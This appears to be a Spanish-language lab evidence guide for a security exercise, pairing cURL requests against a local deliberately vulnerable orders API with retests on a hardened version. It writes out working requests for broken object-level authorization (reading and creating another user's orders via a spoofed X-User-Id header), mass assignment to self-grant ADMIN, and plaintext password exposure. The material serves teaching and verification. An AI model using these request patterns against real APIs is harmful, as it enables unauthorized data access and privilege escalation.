# Guía de Evidencias de Explotación y Retest — Postman / cURL

Este documento compila las peticiones exactas y las respuestas observadas tanto en la fase de explotación (versión vulnerable) como en la fase de verificación (versión segura). Puedes usar estas peticiones con **Postman** o con comandos **cURL** desde la terminal.

---

## 1. Fase de Explotación (Versión Vulnerable: `pedidos-api-vulnerable`)

> **Requisito previo:** La API vulnerable debe estar ejecutándose en `http://localhost:8080`.

### Evidencia 1: Reconocimiento y Exposición de Contraseñas
- **Método:** `GET`
- **URL:** `http://localhost:8080/api/usuarios`
- **cURL:**
  ```bash
  curl -X GET http://localhost:8080/api/usuarios -H "Accept: application/json"
  ```
- **Respuesta (200 OK):**
  ```json
  [
    {
      "id": 1,
      "nombre": "Ana",
      "email": "ana@itson.mx",
      "password": "ana12345",
      "rol": "USER"
    },
    {
      "id": 2,
      "nombre": "Beto",
      "email": "beto@itson.mx",
      "password": "beto12345",
      "rol": "USER"
    }
  ]
  ```
- **Falla observada:** Exposición flagrante de contraseñas de todos los usuarios en texto plano.

---

### Evidencia 2: BOLA de Lectura (Consulta de Pedido Ajeno)
- **Método:** `GET`
- **URL:** `http://localhost:8080/api/pedidos/3`
- **Cabecera:** `X-User-Id: 1` (Simulando a Ana queriendo ver el pedido 3 de Beto)
- **cURL:**
  ```bash
  curl -X GET http://localhost:8080/api/pedidos/3 -H "X-User-Id: 1" -H "Accept: application/json"
  ```
- **Respuesta (200 OK):**
  ```json
  {
    "id": 3,
    "descripcion": "Monitor 24 pulgadas",
    "monto": 3200.0,
    "fecha": "2026-10-02",
    "usuario": {
      "id": 2,
      "nombre": "Beto",
      "email": "beto@itson.mx",
      "password": "beto12345",
      "rol": "USER"
    }
  }
  ```
- **Falla observada:** Ana (ID 1) accede sin restricciones al pedido 3 perteneciente a Beto (ID 2), visualizando además sus datos personales y clave.

---

### Evidencia 3: BOLA de Escritura (Creación de Pedido a Nombre Ajeno)
- **Método:** `POST`
- **URL:** `http://localhost:8080/api/pedidos`
- **Cabecera:** `X-User-Id: 1`, `Content-Type: application/json`
- **Cuerpo JSON:**
  ```json
  {
    "descripcion": "Pedido inyectado a nombre de Beto",
    "monto": 99999.00,
    "fecha": "2026-11-11",
    "usuario": { "id": 2 }
  }
  ```
- **cURL:**
  ```bash
  curl -X POST http://localhost:8080/api/pedidos \
    -H "X-User-Id: 1" \
    -H "Content-Type: application/json" \
    -d "{\"descripcion\":\"Pedido inyectado a nombre de Beto\",\"monto\":99999.00,\"fecha\":\"2026-11-11\",\"usuario\":{\"id\":2}}"
  ```
- **Respuesta (200 OK / 201 Created):**
  ```json
  {
    "id": 4,
    "descripcion": "Pedido inyectado a nombre de Beto",
    "monto": 99999.0,
    "fecha": "2026-11-11",
    "usuario": {
      "id": 2,
      "nombre": "Beto",
      "email": "beto@itson.mx",
      "password": "beto12345",
      "rol": "USER"
    }
  }
  ```
- **Falla observada:** El pedido de $99,999.00 se guardó a nombre de Beto, manipulando el objeto anidado `usuario`.

---

### Evidencia 4: Mass Assignment (Autoasignación de Rol ADMIN)
- **Método:** `POST`
- **URL:** `http://localhost:8080/api/usuarios`
- **Cabecera:** `Content-Type: application/json`
- **Cuerpo JSON:**
  ```json
  {
    "nombre": "Eve Atacante",
    "email": "eve@atacante.mx",
    "password": "clave12345",
    "rol": "ADMIN",
    "id": 999
  }
  ```
- **cURL:**
  ```bash
  curl -X POST http://localhost:8080/api/usuarios \
    -H "Content-Type: application/json" \
    -d "{\"nombre\":\"Eve Atacante\",\"email\":\"eve@atacante.mx\",\"password\":\"clave12345\",\"rol\":\"ADMIN\",\"id\":999}"
  ```
- **Respuesta (201 Created):**
  ```json
  {
    "id": 999,
    "nombre": "Eve Atacante",
    "email": "eve@atacante.mx",
    "password": "clave12345",
    "rol": "ADMIN"
  }
  ```
- **Falla observada:** El servidor enlazó directamente el campo `"rol": "ADMIN"` e `"id": 999`, permitiendo escalamiento a administrador sin autorización.

---

## 2. Fase de Verificación y Defensas (Versión Segura: `pedidos-api-seguro`)

> **Requisito previo:** Detener la API vulnerable e iniciar la API segura en el puerto `8080`.

### Evidencia 5: Bloqueo de BOLA de Lectura
- **Método:** `GET`
- **URL:** `http://localhost:8080/api/pedidos/3`
- **Cabecera:** `X-User-Id: 1`
- **Respuesta (403 Forbidden):**
  ```json
  {
    "codigo": 403,
    "error": "No tiene permisos para acceder al pedido solicitado",
    "timestamp": "2026-11-19T22:15:00"
  }
  ```
- **Defensa confirmada:** Control de acceso a nivel de objeto activo.

---

### Evidencia 6: Bloqueo sin Encabezado de Sesión
- **Método:** `GET`
- **URL:** `http://localhost:8080/api/pedidos/1`
- **Cabecera:** Ninguna
- **Respuesta (401 Unauthorized):**
  ```json
  {
    "codigo": 401,
    "error": "No autenticado: falta el encabezado X-User-Id",
    "timestamp": "2026-11-19T22:15:00"
  }
  ```
- **Defensa confirmada:** La API exige identidad simulada para operar.

---

### Evidencia 7: Bloqueo de BOLA de Escritura / Esquema Estricto
- **Método:** `POST`
- **URL:** `http://localhost:8080/api/pedidos`
- **Cabecera:** `X-User-Id: 1`, `Content-Type: application/json`
- **Cuerpo JSON:**
  ```json
  {
    "descripcion": "Intento con usuario ajeno",
    "monto": 2500.00,
    "usuario": { "id": 2 }
  }
  ```
- **Respuesta (400 Bad Request):**
  ```json
  {
    "codigo": 400,
    "error": "El cuerpo de la solicitud no es válido o contiene campos desconocidos",
    "timestamp": "2026-11-19T22:15:00"
  }
  ```
- **Defensa confirmada:** Jackson rechaza la propiedad `usuario` no reconocida en `PedidoCreacionDTO`.

---

### Evidencia 8: Bloqueo de Mass Assignment
- **Método:** `POST`
- **URL:** `http://localhost:8080/api/usuarios`
- **Cabecera:** `Content-Type: application/json`
- **Cuerpo JSON:**
  ```json
  {
    "nombre": "Eve Atacante",
    "email": "eve2@atacante.mx",
    "password": "clave12345",
    "rol": "ADMIN"
  }
  ```
- **Respuesta (400 Bad Request):**
  ```json
  {
    "codigo": 400,
    "error": "El cuerpo de la solicitud no es válido o contiene campos desconocidos",
    "timestamp": "2026-11-19T22:15:00"
  }
  ```
- **Defensa confirmada:** No es posible manipular el rol.

---

### Evidencia 9: Validación Estricta de Esquemas
- **Método:** `POST`
- **URL:** `http://localhost:8080/api/usuarios`
- **Cuerpo JSON:**
  ```json
  {
    "nombre": "",
    "email": "correo-invalido",
    "password": "123"
  }
  ```
- **Respuesta (400 Bad Request):**
  ```json
  {
    "nombre": "El nombre es obligatorio",
    "email": "El correo electrónico no tiene un formato válido",
    "password": "La contraseña debe tener entre 8 y 64 caracteres"
  }
  ```
- **Defensa confirmada:** Bean Validation (`@Valid`) retorna mensajes específicos por campo sin exponer excepciones internas.

